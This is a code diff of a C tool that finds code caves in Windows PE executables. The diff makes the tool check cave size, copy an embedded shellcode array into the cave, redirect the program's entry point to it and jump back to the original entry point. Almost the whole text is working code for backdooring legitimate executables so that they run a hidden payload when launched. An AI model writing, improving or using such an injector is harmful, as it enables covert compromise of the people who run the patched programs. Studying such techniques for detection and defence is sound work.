@@ -6,9 +6,11 @@ typedef struct _CAVE_INFO
 	PBYTE pStartAddress;
 	PBYTE pEndAddress;
 	DWORD dwSize;
+	DWORD offset;
+	DWORD rva;
 } CAVE_INFO, * PCAVE_INFO;
 
-int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD *caveOffset, DWORD *caveRVA)
+int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, CAVE_INFO *caveInfo)
 {
 	PBYTE pSectionStart = pBuffer + pSectionHeader->PointerToRawData;
 	DWORD dwSectionSize = pSectionHeader->SizeOfRawData;
@@ -19,7 +21,7 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD 
 
 	DWORD caveSize = 0;
 	PBYTE previousAddress = NULL;
-	CAVE_INFO caveInfo[100] = {0};
+	CAVE_INFO caveInfoArray[100] = {0};
 	int caveIndex = 0;
 
 	for (DWORD i = 0; i <= dwSectionSize; i++)
@@ -52,7 +54,7 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD 
 				printf("CAVE Start: %p\n", cave.pStartAddress);
 				printf("CAVE End: %p\n", cave.pEndAddress);
 				printf("CAVE Size: %d\n", cave.dwSize);
-				caveInfo[caveIndex] = cave;
+				caveInfoArray[caveIndex] = cave;
 				caveIndex++;
 			}
 
@@ -71,24 +73,27 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD 
 	for (int i = 0; i < caveIndex; i++)
 	{
 		printf("Cave [%d]:\n", i);
-		printf("  Start Address: 0x%p\n", caveInfo[i].pStartAddress);
-		//printf("  Previous Byte: 0x%02X\n", *(PBYTE*)(caveInfo[i].pStartAddress - 1));
-		printf("  End Address: 0x%p\n", caveInfo[i].pEndAddress);
-		printf("  Size: %d bytes\n", caveInfo[i].dwSize);
-		DWORD caveSectionOffset = (DWORD)(caveInfo[i].pStartAddress - pSectionStart);
+		DWORD caveSectionOffset = (DWORD)(caveInfoArray[i].pStartAddress - pSectionStart);
 		DWORD rva = pSectionHeader->VirtualAddress + caveSectionOffset;
 		DWORD caveFileOffset = pSectionHeader->PointerToRawData + caveSectionOffset;
-		printf("  RVA: 0x%04X\n", rva);
-		printf("  Offset: 0x%04X\n", caveFileOffset);
+
 		// TODO: Grab largest cave or give user option to select cave instead of just grabbing the last one.
-		*caveOffset = caveFileOffset;
-		*caveRVA = rva;
+		caveInfo->pStartAddress = caveInfoArray[i].pStartAddress;
+		caveInfo->pEndAddress = caveInfoArray[i].pEndAddress;
+		caveInfo->dwSize = caveInfoArray[i].dwSize;
+		caveInfo->offset = caveFileOffset;
+		caveInfo->rva = rva;
+		printf("  Start Address: 0x%p\n", caveInfo->pStartAddress);
+		printf("  End Address: 0x%p\n", caveInfo->pEndAddress);
+		printf("  Size: %d bytes\n", caveInfo->dwSize);
+		printf("  Offset: 0x%04X\n", caveInfo->offset);
+		printf("  RVA: 0x%04X\n", caveInfo->rva);
 	}
 
 	return 0;
 }
 
-void generatePayload(DWORD originalEntryPoint, DWORD caveRVA, PBYTE pCaveAddress)
+BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCaveAddress)
 {
 	unsigned char payload[] = {0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00,
 		0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c,
@@ -111,13 +116,19 @@ void generatePayload(DWORD originalEntryPoint, DWORD caveRVA, PBYTE pCaveAddress
 
 	DWORD scSize = sizeof(payload);
 
-	printf("[+] Size of shellcode: %d\n", scSize);
+	printf("[+] Size of shellcode (+5): %d\n", scSize + 5);
+	printf("[+] Size of cave: %d\n", pCaveInfo->dwSize);
+	if (scSize + 5 > pCaveInfo->dwSize)
+	{
+		printf("\033[0;31m[!] Cave is too small for payload!\033[0m\n");
+		return FALSE;
+	}
 
 	printf("[+] Adding shellcode to code cave\n");
 	memcpy((void*)pCaveAddress, payload, scSize);
 
 	printf("Adding patch back to original entrypoint RVA\n");
-	DWORD jmpRVA = caveRVA + sizeof(payload);
+	DWORD jmpRVA = pCaveInfo->rva + sizeof(payload);
 	DWORD rel32 = (DWORD)(originalEntryPoint - (jmpRVA + 5));
 
 	pCaveAddress[scSize] = 0xE9; // jmp
@@ -127,7 +138,7 @@ void generatePayload(DWORD originalEntryPoint, DWORD caveRVA, PBYTE pCaveAddress
 	{
 		if (i == sizeof(payload) - 1)
 		{
-			printf("0x%02X", payload[i]);
+			printf("0x%02X\n", payload[i]);
 		}
 		else
 		{
@@ -138,6 +149,7 @@ void generatePayload(DWORD originalEntryPoint, DWORD caveRVA, PBYTE pCaveAddress
 			printf("\n");
 		}
 	}
+	return TRUE;
 }
 
 int main(int argc, char *argv[])
@@ -189,13 +201,11 @@ int main(int argc, char *argv[])
 	printf("[+] EntryPoint RVA: 0x%04X\n", originalEntryPoint);
 
 	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(pNTHeaders);
-	DWORD caveOffset = 0;
-	DWORD caveRVA = 0;
+	CAVE_INFO caveInfo = { 0 };
 
 	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++)
 	{
 		printf("[+] Section %d: %s\n", i + 1, sectionHeaders[i].Name);
-		printf("[+] Data Location: 0x%p\n", (PBYTE)pBuffer + sectionHeaders[i].PointerToRawData);
 		printf("    Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
 		printf("    Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
 		printf("    Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
@@ -205,18 +215,25 @@ int main(int argc, char *argv[])
 			printf("    [*] Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
 			printf("    [*] Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
 			printf("    [*] Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
-			enumerateSection(&sectionHeaders[i], (PBYTE)pBuffer, &caveOffset, &caveRVA);
+			enumerateSection(&sectionHeaders[i], (PBYTE)pBuffer, &caveInfo);
 		}
 	}
 
-	printf("[+] Updating entrypoint to code cave offset\n");
-	pNTHeaders->OptionalHeader.AddressOfEntryPoint = caveRVA;
+	PBYTE caveAddress = (PBYTE)pBuffer + caveInfo.offset;
+
+	if (!generatePayload(originalEntryPoint, &caveInfo, caveAddress))
+	{
+		UnmapViewOfFile(pBuffer);
+		CloseHandle(hMap);
+		CloseHandle(hFile);
+		return 1;
+	}
+
+	printf("[+] Updating entrypoint to code cave RVA\n");
+	pNTHeaders->OptionalHeader.AddressOfEntryPoint = caveInfo.rva;
 
 	printf("[+] New EntryPoint RVA: 0x%04X\n", pNTHeaders->OptionalHeader.AddressOfEntryPoint);
 
-	PBYTE caveAddress = (PBYTE)pBuffer + caveOffset;
-
-	generatePayload(originalEntryPoint, caveRVA, caveAddress);
 
 	printf("[+] Saving modifications\n");
 
